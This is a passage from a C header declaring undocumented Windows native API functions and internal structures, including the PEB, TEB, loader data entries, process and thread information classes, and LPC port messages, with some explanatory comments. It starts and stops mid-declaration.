    IN  PIO_APC_ROUTINE ApcRoutine,
    IN  PVOID ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN  ULONG IoControlCode,
    IN  PVOID InputBuffer,
    IN  ULONG InputBufferLength,
    IN  PVOID OutputBuffer,
    IN  ULONG OutputBufferLength
    );


NTSYSAPI
NTSTATUS
NTAPI
ZwDeviceIoControlFile(
    IN  HANDLE FileHandle,
    IN  HANDLE Event,
    IN  PIO_APC_ROUTINE ApcRoutine,
    IN  PVOID ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN  ULONG IoControlCode,
    IN  PVOID InputBuffer,
    IN  ULONG InputBufferLength,
    IN  PVOID OutputBuffer,
    IN  ULONG OutputBufferLength
    );


NTSYSAPI
NTSTATUS
NTAPI
NtCancelIoFile(
    IN HANDLE Filehandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock
    );


NTSYSAPI
NTSTATUS
NTAPI
ZwCancelIoFile(
    IN HANDLE Filehandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock
    );


NTSYSAPI
BOOLEAN
NTAPI
RtlDosPathNameToNtPathName_U (
    IN  PWSTR DosPathName,
    OUT PUNICODE_STRING NtPathName,
    OUT PWSTR * NtFileNamePart OPTIONAL,
    OUT PCURDIR DirectoryInfo OPTIONAL
    );


//-----------------------------------------------------------------------------
// Process functions

#define GDI_HANDLE_BUFFER_SIZE      34

//
// Process Information Classes
//

typedef enum _PROCESSINFOCLASS {
    ProcessBasicInformation,
    ProcessQuotaLimits,
    ProcessIoCounters,
    ProcessVmCounters,
    ProcessTimes,
    ProcessBasePriority,
    ProcessRaisePriority,
    ProcessDebugPort,
    ProcessExceptionPort,
    ProcessAccessToken,
    ProcessLdtInformation,
    ProcessLdtSize,
    ProcessDefaultHardErrorMode,
    ProcessIoPortHandlers,          // Note: this is kernel mode only
    ProcessPooledUsageAndLimits,
    ProcessWorkingSetWatch,
    ProcessUserModeIOPL,
    ProcessEnableAlignmentFaultFixup,
    ProcessPriorityClass,
    ProcessWx86Information,
    ProcessHandleCount,
    ProcessAffinityMask,
    ProcessPriorityBoost,
    ProcessDeviceMap,
    ProcessSessionInformation,
    ProcessForegroundInformation,
    ProcessWow64Information,
    ProcessImageFileName,
    ProcessLUIDDeviceMapsEnabled,
    ProcessBreakOnTermination,
    ProcessDebugObjectHandle,
    ProcessDebugFlags,
    ProcessHandleTracing,
    MaxProcessInfoClass                             // MaxProcessInfoClass should always be the last enum
} PROCESSINFOCLASS;


typedef struct _THREAD_BASIC_INFORMATION {
  NTSTATUS                ExitStatus;
  PVOID                   TebBaseAddress;
  CLIENT_ID               ClientId;
  KAFFINITY               AffinityMask;
  KPRIORITY               Priority;
  KPRIORITY               BasePriority;
} THREAD_BASIC_INFORMATION, *PTHREAD_BASIC_INFORMATION;


//
// Thread Information Classes
//

typedef enum _THREADINFOCLASS {
    ThreadBasicInformation,                            // ??
    ThreadTimes,
    ThreadPriority,                                    // ??
    ThreadBasePriority,                                // ??
    ThreadAffinityMask,                                // ??
    ThreadImpersonationToken,                        // HANDLE
    ThreadDescriptorTableEntry,                        // ULONG Selector + LDT_ENTRY
    ThreadEnableAlignmentFaultFixup,                // ??
    ThreadEventPair,                                // ??
    ThreadQuerySetWin32StartAddress,                // ??
    ThreadZeroTlsCell,                                // ??
    ThreadPerformanceCount,                            // ??
    ThreadAmILastThread,                            // ??
    ThreadIdealProcessor,                            // ??
    ThreadPriorityBoost,                            // ??
    ThreadSetTlsArrayAddress,                        // ??
    MaxThreadInfoClass
} THREADINFOCLASS;

//
// System Information Class for Nt*InformationWorkerFactory group of functions
//
typedef enum _WORKERFACTORYINFOCLASS
{
    WorkerFactoryTimeout,
    WorkerFactoryRetryTimeout,
    WorkerFactoryIdleTimeout,
    WorkerFactoryBindingCount,
    WorkerFactoryThreadMinimum,
    WorkerFactoryThreadMaximum,
    WorkerFactoryPaused,
    WorkerFactoryBasicInformation,
    WorkerFactoryAdjustThreadGoal,
    WorkerFactoryCallbackType,
    WorkerFactoryStackInformation,
    MaxWorkerFactoryInfoClass
} WORKERFACTORYINFOCLASS, *PWORKERFACTORYINFOCLASS;

typedef struct _WORKER_FACTORY_BASIC_INFORMATION {
	LARGE_INTEGER Timeout;
	LARGE_INTEGER RetryTimeout;
	LARGE_INTEGER IdleTimeout;
	BOOLEAN       Paused;
	BOOLEAN       TimerSet;
	BOOLEAN       QueuedToExWorker;
	BOOLEAN       MayCreate;
	BOOLEAN       CreateInProgress;
	BOOLEAN       InsertedIntoQueue;
	BOOLEAN       Shutdown;
	ULONG         BindingCount;
	ULONG         ThreadMinimum;
  
	ULONG         ThreadMaximum;
	ULONG         PendingWorkerCount;
	
  ULONG         WaitingWorkerCount;
	ULONG         TotalWorkerCount;
	
  ULONG         ReleaseCount;
	
  LONGLONG      InfiniteWaitGoal;
	PVOID         StartRoutine;
	PVOID         StartParameter;
	DWORD         ProcessId;
	SIZE_T        StackReserve;
	SIZE_T        StackCommit;
	NTSTATUS      LastThreadCreationStatus;
} WORKER_FACTORY_BASIC_INFORMATION, *PWORKER_FACTORY_BASIC_INFORMATION;
 
typedef struct _RTL_DRIVE_LETTER_CURDIR
{
    USHORT Flags;
    USHORT Length;
    ULONG  TimeStamp;
    STRING DosPath;

} RTL_DRIVE_LETTER_CURDIR, *PRTL_DRIVE_LETTER_CURDIR;


//0x298 bytes (sizeof)
typedef struct _RTL_USER_PROCESS_PARAMETERS
{
    ULONG MaximumLength;                                                    //0x0
    ULONG Length;                                                           //0x4
    ULONG Flags;                                                            //0x8
    ULONG DebugFlags;                                                       //0xc
    VOID* ConsoleHandle;                                                    //0x10
    ULONG ConsoleFlags;                                                     //0x14
    VOID* StandardInput;                                                    //0x18
    VOID* StandardOutput;                                                   //0x1c
    VOID* StandardError;                                                    //0x20
    struct _CURDIR CurrentDirectory;                                        //0x24
    struct _UNICODE_STRING DllPath;                                         //0x30
    struct _UNICODE_STRING ImagePathName;                                   //0x38
    struct _UNICODE_STRING CommandLine;                                     //0x40
    VOID* Environment;                                                      //0x48
    ULONG StartingX;                                                        //0x4c
    ULONG StartingY;                                                        //0x50
    ULONG CountX;                                                           //0x54
    ULONG CountY;                                                           //0x58
    ULONG CountCharsX;                                                      //0x5c
    ULONG CountCharsY;                                                      //0x60
    ULONG FillAttribute;                                                    //0x64
    ULONG WindowFlags;                                                      //0x68
    ULONG ShowWindowFlags;                                                  //0x6c
    struct _UNICODE_STRING WindowTitle;                                     //0x70
    struct _UNICODE_STRING DesktopInfo;                                     //0x78
    struct _UNICODE_STRING ShellInfo;                                       //0x80
    struct _UNICODE_STRING RuntimeData;                                     //0x88
    struct _RTL_DRIVE_LETTER_CURDIR CurrentDirectores[32];                  //0x90
    volatile ULONG EnvironmentSize;                                         //0x290
    volatile ULONG EnvironmentVersion;                                      //0x294
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS; 

//
// Process Environment Block
//

typedef struct _PEB_FREE_BLOCK
{
    struct _PEB_FREE_BLOCK *Next;
    ULONG Size;

} PEB_FREE_BLOCK, *PPEB_FREE_BLOCK;


typedef struct _PEB_LDR_DATA
{
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;               // Points to the loaded modules (main EXE usually)
    LIST_ENTRY InMemoryOrderModuleList;             // Points to all modules (EXE and all DLLs)
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID      EntryInProgress;

} PEB_LDR_DATA, *PPEB_LDR_DATA;


typedef struct _LDR_DATA_TABLE_ENTRY
{
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;                             // Base address of the module
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG  Flags;
    USHORT LoadCount;
    USHORT TlsIndex;
    LIST_ENTRY HashLinks;
    PVOID SectionPointer;
    ULONG CheckSum;
    ULONG TimeDateStamp;
    PVOID LoadedImports;
    PVOID EntryPointActivationContext;
    PVOID PatchInformation;
    PVOID Unknown1;
    PVOID Unknown2;
    PVOID Unknown3;

} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;


//0x7c8 bytes (sizeof)
typedef struct _PEB
{
    UCHAR InheritedAddressSpace;                                            //0x0
    UCHAR ReadImageFileExecOptions;                                         //0x1
    UCHAR BeingDebugged;                                                    //0x2
    union
    {
        UCHAR BitField;                                                     //0x3
        struct
        {
            UCHAR ImageUsesLargePages:1;                                    //0x3
            UCHAR IsProtectedProcess:1;                                     //0x3
            UCHAR IsImageDynamicallyRelocated:1;                            //0x3
            UCHAR SkipPatchingUser32Forwarders:1;                           //0x3
            UCHAR IsPackagedProcess:1;                                      //0x3
            UCHAR IsAppContainer:1;                                         //0x3
            UCHAR IsProtectedProcessLight:1;                                //0x3
            UCHAR IsLongPathAwareProcess:1;                                 //0x3
        };
    };
    UCHAR Padding0[4];                                                      //0x4
    VOID* Mutant;                                                           //0x8
    VOID* ImageBaseAddress;                                                 //0x10
    struct _PEB_LDR_DATA* Ldr;                                              //0x18
    struct _RTL_USER_PROCESS_PARAMETERS* ProcessParameters;                 //0x20
    VOID* SubSystemData;                                                    //0x28
    VOID* ProcessHeap;                                                      //0x30
    struct _RTL_CRITICAL_SECTION* FastPebLock;                              //0x38
    union _SLIST_HEADER* volatile AtlThunkSListPtr;                         //0x40
    VOID* IFEOKey;                                                          //0x48
    union
    {
        ULONG CrossProcessFlags;                                            //0x50
        struct
        {
            ULONG ProcessInJob:1;                                           //0x50
            ULONG ProcessInitializing:1;                                    //0x50
            ULONG ProcessUsingVEH:1;                                        //0x50
            ULONG ProcessUsingVCH:1;                                        //0x50
            ULONG ProcessUsingFTH:1;                                        //0x50
            ULONG ProcessPreviouslyThrottled:1;                             //0x50
            ULONG ProcessCurrentlyThrottled:1;                              //0x50
            ULONG ProcessImagesHotPatched:1;                                //0x50
            ULONG ReservedBits0:24;                                         //0x50
        };
    };
    UCHAR Padding1[4];                                                      //0x54
    union
    {
        VOID* KernelCallbackTable;                                          //0x58
        VOID* UserSharedInfoPtr;                                            //0x58
    };
    ULONG SystemReserved;                                                   //0x60
    ULONG AtlThunkSListPtr32;                                               //0x64
    VOID* ApiSetMap;                                                        //0x68
    ULONG TlsExpansionCounter;                                              //0x70
    UCHAR Padding2[4];                                                      //0x74
    VOID* TlsBitmap;                                                        //0x78
    ULONG TlsBitmapBits[2];                                                 //0x80
    VOID* ReadOnlySharedMemoryBase;                                         //0x88
    VOID* SharedData;                                                       //0x90
    VOID** ReadOnlyStaticServerData;                                        //0x98
    VOID* AnsiCodePageData;                                                 //0xa0
    VOID* OemCodePageData;                                                  //0xa8
    VOID* UnicodeCaseTableData;                                             //0xb0
    ULONG NumberOfProcessors;                                               //0xb8
    ULONG NtGlobalFlag;                                                     //0xbc
    union _LARGE_INTEGER CriticalSectionTimeout;                            //0xc0
    ULONGLONG HeapSegmentReserve;                                           //0xc8
    ULONGLONG HeapSegmentCommit;                                            //0xd0
    ULONGLONG HeapDeCommitTotalFreeThreshold;                               //0xd8
    ULONGLONG HeapDeCommitFreeBlockThreshold;                               //0xe0
    ULONG NumberOfHeaps;                                                    //0xe8
    ULONG MaximumNumberOfHeaps;                                             //0xec
    VOID** ProcessHeaps;                                                    //0xf0
    VOID* GdiSharedHandleTable;                                             //0xf8
    VOID* ProcessStarterHelper;                                             //0x100
    ULONG GdiDCAttributeList;                                               //0x108
    UCHAR Padding3[4];                                                      //0x10c
    struct _RTL_CRITICAL_SECTION* LoaderLock;                               //0x110
    ULONG OSMajorVersion;                                                   //0x118
    ULONG OSMinorVersion;                                                   //0x11c
    USHORT OSBuildNumber;                                                   //0x120
    USHORT OSCSDVersion;                                                    //0x122
    ULONG OSPlatformId;                                                     //0x124
    ULONG ImageSubsystem;                                                   //0x128
    ULONG ImageSubsystemMajorVersion;                                       //0x12c
    ULONG ImageSubsystemMinorVersion;                                       //0x130
    UCHAR Padding4[4];                                                      //0x134
    ULONGLONG ActiveProcessAffinityMask;                                    //0x138
    ULONG GdiHandleBuffer[60];                                              //0x140
    VOID (*PostProcessInitRoutine)();                                       //0x230
    VOID* TlsExpansionBitmap;                                               //0x238
    ULONG TlsExpansionBitmapBits[32];                                       //0x240
    ULONG SessionId;                                                        //0x2c0
    UCHAR Padding5[4];                                                      //0x2c4
    union _ULARGE_INTEGER AppCompatFlags;                                   //0x2c8
    union _ULARGE_INTEGER AppCompatFlagsUser;                               //0x2d0
    VOID* pShimData;                                                        //0x2d8
    VOID* AppCompatInfo;                                                    //0x2e0
    struct _UNICODE_STRING CSDVersion;                                      //0x2e8
    struct _ACTIVATION_CONTEXT_DATA* ActivationContextData;                 //0x2f8
    struct _ASSEMBLY_STORAGE_MAP* ProcessAssemblyStorageMap;                //0x300
    struct _ACTIVATION_CONTEXT_DATA* SystemDefaultActivationContextData;    //0x308
    struct _ASSEMBLY_STORAGE_MAP* SystemAssemblyStorageMap;                 //0x310
    ULONGLONG MinimumStackCommit;                                           //0x318
    struct _FLS_CALLBACK_INFO* FlsCallback;                                 //0x320
    struct _LIST_ENTRY FlsListHead;                                         //0x328
    VOID* FlsBitmap;                                                        //0x338
    ULONG FlsBitmapBits[4];                                                 //0x340
    ULONG FlsHighIndex;                                                     //0x350
    VOID* WerRegistrationData;                                              //0x358
    VOID* WerShipAssertPtr;                                                 //0x360
    VOID* pUnused;                                                          //0x368
    VOID* pImageHeaderHash;                                                 //0x370
    union
    {
        ULONG TracingFlags;                                                 //0x378
        struct
        {
            ULONG HeapTracingEnabled:1;                                     //0x378
            ULONG CritSecTracingEnabled:1;                                  //0x378
            ULONG LibLoaderTracingEnabled:1;                                //0x378
            ULONG SpareTracingBits:29;                                      //0x378
        };
    };
    UCHAR Padding6[4];                                                      //0x37c
    ULONGLONG CsrServerReadOnlySharedMemoryBase;                            //0x380
    ULONGLONG TppWorkerpListLock;                                           //0x388
    struct _LIST_ENTRY TppWorkerpList;                                      //0x390
    VOID* WaitOnAddressHashTable[128];                                      //0x3a0
    VOID* TelemetryCoverageHeader;                                          //0x7a0
    ULONG CloudFileFlags;                                                   //0x7a8
    ULONG CloudFileDiagFlags;                                               //0x7ac
    CHAR PlaceholderCompatibilityMode;                                      //0x7b0
    CHAR PlaceholderCompatibilityModeReserved[7];                           //0x7b1
    struct _LEAP_SECOND_DATA* LeapSecondData;                               //0x7b8
    union
    {
        ULONG LeapSecondFlags;                                              //0x7c0
        struct
        {
            ULONG SixtySecondEnabled:1;                                     //0x7c0
            ULONG Reserved:31;                                              //0x7c0
        };
    };
    ULONG NtGlobalFlag2;                                                    //0x7c4
} PEB, *PPEB; 

typedef struct _RTL_ACTIVATION_CONTEXT_STACK_FRAME *PRTL_ACTIVATION_CONTEXT_STACK_FRAME;
typedef struct _ACTIVATION_CONTEXT *PACTIVATION_CONTEXT;
typedef struct _TEB_ACTIVE_FRAME *PTEB_ACTIVE_FRAME;
typedef struct _TEB_ACTIVE_FRAME_CONTEXT *PTEB_ACTIVE_FRAME_CONTEXT;

typedef struct _RTL_ACTIVATION_CONTEXT_STACK_FRAME {
     PRTL_ACTIVATION_CONTEXT_STACK_FRAME Previous;
     PACTIVATION_CONTEXT *ActivationContext;
     ULONG Flags;
} RTL_ACTIVATION_CONTEXT_STACK_FRAME, *PRTL_ACTIVATION_CONTEXT_STACK_FRAME;

typedef struct _ACTIVATION_CONTEXT_STACK
{
     PRTL_ACTIVATION_CONTEXT_STACK_FRAME ActiveFrame;
     LIST_ENTRY FrameListCache;
     ULONG Flags;
     ULONG NextCookieSequenceNumber;
     ULONG StackId;
} ACTIVATION_CONTEXT_STACK, *PACTIVATION_CONTEXT_STACK;
#define GDI_BATCH_BUFFER_SIZE 310

typedef struct _GDI_TEB_BATCH
{
    ULONG Offset;
    ULONG_PTR HDC;
    ULONG Buffer[GDI_BATCH_BUFFER_SIZE];
} GDI_TEB_BATCH, *PGDI_TEB_BATCH;

typedef struct _TEB_ACTIVE_FRAME_CONTEXT
{
    ULONG Flags;
    PSTR FrameName;
} TEB_ACTIVE_FRAME_CONTEXT, *PTEB_ACTIVE_FRAME_CONTEXT;

typedef struct _TEB_ACTIVE_FRAME
{
    ULONG Flags;
    struct _TEB_ACTIVE_FRAME *Previous;
    PTEB_ACTIVE_FRAME_CONTEXT Context;
} TEB_ACTIVE_FRAME, *PTEB_ACTIVE_FRAME;

typedef struct _TEB
{
    NT_TIB NtTib;

    PVOID EnvironmentPointer;
    CLIENT_ID ClientId;
    PVOID ActiveRpcHandle;
    PVOID ThreadLocalStoragePointer;
    PPEB ProcessEnvironmentBlock;

    ULONG LastErrorValue;
    ULONG CountOfOwnedCriticalSections;
    PVOID CsrClientThread;
    PVOID Win32ThreadInfo;
    ULONG User32Reserved[26];
    ULONG UserReserved[5];
    PVOID WOW32Reserved;
    LCID CurrentLocale;
    ULONG FpSoftwareStatusRegister;
    PVOID SystemReserved1[54];
    NTSTATUS ExceptionCode;
    PVOID ActivationContextStackPointer;
#ifdef _M_X64
    UCHAR SpareBytes[24];
#else
    UCHAR SpareBytes[36];
#endif
    ULONG TxFsContext;

    GDI_TEB_BATCH GdiTebBatch;
    CLIENT_ID RealClientId;
    HANDLE GdiCachedProcessHandle;
    ULONG GdiClientPID;
    ULONG GdiClientTID;
    PVOID GdiThreadLocalInfo;
    ULONG_PTR Win32ClientInfo[62];
    PVOID glDispatchTable[233];
    ULONG_PTR glReserved1[29];
    PVOID glReserved2;
    PVOID glSectionInfo;
    PVOID glSection;
    PVOID glTable;
    PVOID glCurrentRC;
    PVOID glContext;

    NTSTATUS LastStatusValue;
    UNICODE_STRING StaticUnicodeString;
    WCHAR StaticUnicodeBuffer[261];

    PVOID DeallocationStack;
    PVOID TlsSlots[64];
    LIST_ENTRY TlsLinks;

    PVOID Vdm;
    PVOID ReservedForNtRpc;
    PVOID DbgSsReserved[2];

    ULONG HardErrorMode;
#ifdef _M_X64
    PVOID Instrumentation[11];
#else
    PVOID Instrumentation[9];
#endif
    GUID ActivityId;

    PVOID SubProcessTag;
    PVOID EtwLocalData;
    PVOID EtwTraceData;
    PVOID WinSockData;
    ULONG GdiBatchCount;

    union
    {
        PROCESSOR_NUMBER CurrentIdealProcessor;
        ULONG IdealProcessorValue;
        struct
        {
            UCHAR ReservedPad0;
            UCHAR ReservedPad1;
            UCHAR ReservedPad2;
            UCHAR IdealProcessor;
        };
    };

    ULONG GuaranteedStackBytes;
    PVOID ReservedForPerf;
    PVOID ReservedForOle;
    ULONG WaitingOnLoaderLock;
    PVOID SavedPriorityState;
    ULONG_PTR SoftPatchPtr1;
    PVOID ThreadPoolData;
    PVOID *TlsExpansionSlots;
#ifdef _M_X64
    PVOID DeallocationBStore;
    PVOID BStoreLimit;
#endif
    ULONG MuiGeneration;
    ULONG IsImpersonating;
    PVOID NlsCache;
    PVOID pShimData;
    ULONG HeapVirtualAffinity;
    HANDLE CurrentTransactionHandle;
    PTEB_ACTIVE_FRAME ActiveFrame;
    PVOID FlsData;

    PVOID PreferredLanguages;
    PVOID UserPrefLanguages;
    PVOID MergedPrefLanguages;
    ULONG MuiImpersonation;

    union
    {
        USHORT CrossTebFlags;
        USHORT SpareCrossTebBits : 16;
    };
    union
    {
        USHORT SameTebFlags;
        struct
        {
            USHORT SafeThunkCall : 1;
            USHORT InDebugPrint : 1;
            USHORT HasFiberData : 1;
            USHORT SkipThreadAttach : 1;
            USHORT WerInShipAssertCode : 1;
            USHORT RanProcessInit : 1;
            USHORT ClonedThread : 1;
            USHORT SuppressDebugMsg : 1;
            USHORT DisableUserStackWalk : 1;
            USHORT RtlExceptionAttached : 1;
            USHORT InitialThread : 1;
            USHORT SessionAware : 1;
            USHORT SpareSameTebBits : 4;
        };
    };

    PVOID TxnScopeEnterCallback;
    PVOID TxnScopeExitCallback;
    PVOID TxnScopeContext;
    ULONG LockCount;
    ULONG SpareUlong0;
    PVOID ResourceRetValue;
    PVOID ReservedForWdf;
} TEB, *PTEB;

/**
typedef struct _GDI_TEB_BATCH {
     ULONG Offset;
     ULONG HDC;
     ULONG Buffer[310];
} GDI_TEB_BATCH, *PGDI_TEB_BATCH;

typedef struct _TEB_ACTIVE_FRAME {
     ULONG Flags;
     PTEB_ACTIVE_FRAME Previous;
     PTEB_ACTIVE_FRAME_CONTEXT Context;
} TEB_ACTIVE_FRAME, *PTEB_ACTIVE_FRAME;

typedef struct _TEB_ACTIVE_FRAME_CONTEXT {
     ULONG Flags;
     CHAR * FrameName;
} TEB_ACTIVE_FRAME_CONTEXT, *PTEB_ACTIVE_FRAME_CONTEXT;

//
// Thread environment block
//

typedef struct _TEB
{
     NT_TIB NtTib;
     PVOID EnvironmentPointer;
     CLIENT_ID ClientId;
     PVOID ActiveRpcHandle;
     PVOID ThreadLocalStoragePointer;
     PPEB ProcessEnvironmentBlock;
     ULONG LastErrorValue;
     ULONG CountOfOwnedCriticalSections;
     PVOID CsrClientThread;
     PVOID Win32ThreadInfo;
     ULONG User32Reserved[26];
     ULONG UserReserved[5];
     PVOID WOW32Reserved;
     ULONG CurrentLocale;
     ULONG FpSoftwareStatusRegister;
     VOID * SystemReserved1[54];
     LONG ExceptionCode;
     PACTIVATION_CONTEXT_STACK ActivationContextStackPointer;
     UCHAR SpareBytes1[36];
     ULONG TxFsContext;
     GDI_TEB_BATCH GdiTebBatch;
     CLIENT_ID RealClientId;
     PVOID GdiCachedProcessHandle;
     ULONG GdiClientPID;
     ULONG GdiClientTID;
     PVOID GdiThreadLocalInfo;
     ULONG Win32ClientInfo[62];
     VOID * glDispatchTable[233];
     ULONG glReserved1[29];
     PVOID glReserved2;
     PVOID glSectionInfo;
     PVOID glSection;
     PVOID glTable;
     PVOID glCurrentRC;
     PVOID glContext;
     ULONG LastStatusValue;
     UNICODE_STRING StaticUnicodeString;
     WCHAR StaticUnicodeBuffer[261];
     PVOID DeallocationStack;
     VOID * TlsSlots[64];
     LIST_ENTRY TlsLinks;
     PVOID Vdm;
     PVOID ReservedForNtRpc;
     VOID * DbgSsReserved[2];
     ULONG HardErrorMode;
     VOID * Instrumentation[9];
     GUID ActivityId;
     PVOID SubProcessTag;
     PVOID EtwLocalData;
     PVOID EtwTraceData;
     PVOID WinSockData;
     ULONG GdiBatchCount;
     UCHAR SpareBool0;
     UCHAR SpareBool1;
     UCHAR SpareBool2;
     UCHAR IdealProcessor;
     ULONG GuaranteedStackBytes;
     PVOID ReservedForPerf;
     PVOID ReservedForOle;
     ULONG WaitingOnLoaderLock;
     PVOID SavedPriorityState;
     ULONG SoftPatchPtr1;
     PVOID ThreadPoolData;
     VOID * * TlsExpansionSlots;
     ULONG ImpersonationLocale;
     ULONG IsImpersonating;
     PVOID NlsCache;
     PVOID pShimData;
     ULONG HeapVirtualAffinity;
     PVOID CurrentTransactionHandle;
     PTEB_ACTIVE_FRAME ActiveFrame;
     PVOID FlsData;
     PVOID PreferredLanguages;
     PVOID UserPrefLanguages;
     PVOID MergedPrefLanguages;
     ULONG MuiImpersonation;
     WORD CrossTebFlags;
     ULONG SpareCrossTebBits: 16;
     WORD SameTebFlags;
     ULONG DbgSafeThunkCall: 1;
     ULONG DbgInDebugPrint: 1;
     ULONG DbgHasFiberData: 1;
     ULONG DbgSkipThreadAttach: 1;
     ULONG DbgWerInShipAssertCode: 1;
     ULONG DbgRanProcessInit: 1;
     ULONG DbgClonedThread: 1;
     ULONG DbgSuppressDebugMsg: 1;
     ULONG SpareSameTebBits: 8;
     PVOID TxnScopeEnterCallback;
     PVOID TxnScopeExitCallback;
     PVOID TxnScopeContext;
     ULONG LockCount;
     ULONG ProcessRundown;
     UINT64 LastSwitchTime;
     UINT64 TotalSwitchOutTime;
     LARGE_INTEGER WaitReasonBitMap;
} TEB, *PTEB;

*/
typedef struct _PROCESS_BASIC_INFORMATION
{
    NTSTATUS ExitStatus;
    PPEB PebBaseAddress;
    ULONG_PTR AffinityMask;
    KPRIORITY BasePriority;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR InheritedFromUniqueProcessId;

} PROCESS_BASIC_INFORMATION,*PPROCESS_BASIC_INFORMATION;



#define NtCurrentProcess() ((HANDLE) -1)
#define NtCurrentThread()  ((HANDLE) -2)

NTSYSAPI
NTSTATUS
NTAPI
NtOpenProcess (
    OUT PHANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN PCLIENT_ID ClientId OPTIONAL
    );

NTSYSCALLAPI
  NTSTATUS
  NTAPI
  NtSuspendProcess(
  IN HANDLE ProcessHandle
  );

NTSYSCALLAPI
  NTSTATUS
  NTAPI
  NtResumeProcess(
  IN HANDLE ProcessHandle
  );

NTSYSAPI
NTSTATUS
NTAPI
NtOpenThread (
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN PCLIENT_ID ClientId OPTIONAL
    );

NTSYSAPI
  NTSTATUS
  NTAPI
  NtQueryInformationThread(
  IN HANDLE  ThreadHandle,
  IN THREADINFOCLASS  ThreadInformationClass,
  OUT PVOID  ThreadInformation,
  IN ULONG  ThreadInformationLength,
  OUT PULONG  ReturnLength  OPTIONAL
  );

NTSYSAPI
NTSTATUS
NTAPI
NtQueryInformationProcess(
    IN HANDLE ProcessHandle,
    IN PROCESSINFOCLASS ProcessInformationClass,
    OUT PVOID ProcessInformation,
    IN ULONG ProcessInformationLength,
    OUT PULONG ReturnLength OPTIONAL
    );


NTSYSAPI
NTSTATUS
NTAPI
NtSetInformationProcess (
    IN HANDLE ProcessHandle,
    IN PROCESSINFOCLASS ProcessInformationClass,
    IN PVOID ProcessInformation,
    IN ULONG ProcessInformationLength
    );

//------------------------------------------------------------------------------
// LPC Functions

#define MAX_LPC_DATA 0x130    // Maximum number of bytes that can be copied through LPC

// LPC connection types
typedef enum _LPC_TYPE
{
    LPC_NEW_MESSAGE,                    // (0) A new message
    LPC_REQUEST,                        // (1) A request message
    LPC_REPLY,                          // (2) A reply to a request message
    LPC_DATAGRAM,                       // (3)
    LPC_LOST_REPLY,                     // (4)
    LPC_PORT_CLOSED,                    // (5) Send when port is deleted
    LPC_CLIENT_DIED,                    // (6) Messages to thread termination ports
    LPC_EXCEPTION,                      // (7) Messages to thread exception ports
    LPC_DEBUG_EVENT,                    // (8) Messages to thread debug port
    LPC_ERROR_EVENT,                    // (9) Used by NtRaiseHardError
    LPC_CONNECTION_REQUEST              // (A) Used by NtConnectPort

} LPC_TYPE, *PLPC_TYPE;

//
// Define header for Port Message
//

typedef struct _PORT_MESSAGE
{
    USHORT DataLength;                  // Length of data following the header (bytes)
    USHORT TotalLength;                 // Length of data + sizeof(PORT_MESSAGE)
    USHORT Type;                        // Type of the message (See LPC_TYPE enum)
    USHORT VirtualRangesOffset;         // Offset of array of virtual address ranges
    CLIENT_ID ClientId;                 // Client identifier of the message sender
    ULONG  MessageId;                   // Identifier of the particular message instance
    union
    {
        ULONG  CallbackId;              //
        ULONG  ClientViewSize;          // Size, in bytes, of section created by the sender
    };

} PORT_MESSAGE, *PPORT_MESSAGE;

//
// Define structure for initializing shared memory on the caller's side of the port
//

typedef struct _PORT_VIEW {

    ULONG  Length;                      // Size of this structure
    HANDLE SectionHandle;               // Handle to section object with
                                        // SECTION_MAP_WRITE and SECTION_MAP_READ
    ULONG  SectionOffset;               // The offset in the section to map a view for
                                        // the port data area. The offset must be aligned
                                        // with the allocation granularity of the system.
    ULONG  ViewSize;                    // The size of the view (in bytes)
    PVOID  ViewBase;                    // The base address of the view in the creator
                                        //
    PVOID  ViewRemoteBase;              // The base address of the view in the process
                                        // connected to the port.
} PORT_VIEW, *PPORT_VIEW;

//
// Define structure for shared memory coming from remote side of the port
//

typedef struct _REMOTE_PORT_VIEW {

    ULONG Length;                       // Size of this structure
    ULONG ViewSize;                     // The size of the view (bytes)
    PVOID ViewBase;                     // Base address of the view

} REMOTE_PORT_VIEW, *PREMOTE_PORT_VIEW;

/*++

    NtCreatePort
    ============

    Creates a LPC port object. The creator of the LPC port becomes a server
    of LPC communication

    PortHandle - Points to a variable that will receive the
        port object handle if the call is successful.

    ObjectAttributes - Points to a structure that specifies the object s
        attributes. OBJ_KERNEL_HANDLE, OBJ_OPENLINK, OBJ_OPENIF, OBJ_EXCLUSIVE,
        OBJ_PERMANENT, and OBJ_INHERIT are not valid attributes for a port object.

    MaxConnectionInfoLength - The maximum size, in bytes, of data that can
        be sent through the port.

    MaxMessageLength - The maximum size, in bytes, of a message
        that can be sent through the port.

    MaxPoolUsage - Specifies the maximum amount of NonPaged pool that can be used for
        message storage. Zero means default value.

    ZwCreatePort verifies that (MaxDataSize <= 0x104) and (MaxMessageSize <= 0x148).

--*/

NTSYSAPI
NTSTATUS
NTAPI
NtCreatePort(
    OUT PHANDLE PortHandle,
    IN  POBJECT_ATTRIBUTES ObjectAttributes,
    IN  ULONG MaxConnectionInfoLength,
    IN  ULONG MaxMessageLength,
    IN  ULONG MaxPoolUsage
    );


/*++

    NtConnectPort
    =============

    Creates a port connected to a named port (cliend side).

    PortHandle - A pointer to a variable that will receive the client
        communication port object handle value.

    PortName - Points to a structure that specifies the name
        of the port to connect to.

    SecurityQos - Points to a structure that specifies the level
        of impersonation available to the port listener.

    ClientView - Optionally points to a structure describing
        the shared memory region used to send large amounts of data
        to the listener; if the call is successful, this will be updated.

    ServerView - Optionally points to a caller-allocated buffer
        or variable that receives information on the shared memory region
        used by the listener to send large amounts of data to the
        caller.

